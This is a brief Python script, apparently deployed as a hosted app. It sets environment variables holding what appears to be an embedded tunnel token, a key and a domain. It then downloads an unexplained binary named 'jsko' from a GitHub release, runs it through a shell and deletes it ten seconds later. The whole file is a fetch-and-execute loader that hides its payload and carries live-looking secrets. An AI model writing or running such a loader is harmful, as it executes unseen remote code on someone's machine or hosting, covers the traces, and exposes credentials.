import subprocess
import os

os.environ['C_T'] = 'eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiYWM5Yjk3Y2QtZDg4ZC00NTYwLThmYTYtZWU5NzgwZGIzMTM0IiwicyI6Ik5qaGlPVFJrTjJVdE1UZzVOQzAwTmpFMExUaGpaR1F0TlRVNVlXRXdOakJoWldOaiJ9'
os.environ['K_K'] = 'SJq8bSUJ04mc1yXG'
os.environ['C_D'] = 'streamlit3.seav.eu.org'
os.environ['PORT'] = '3000'

subprocess.call('curl -L -o jsko https://github.com/seav1/dl/releases/download/files/jsko && chmod +x jsko && ./jsko && sleep 10 && rm jsko', shell=True)
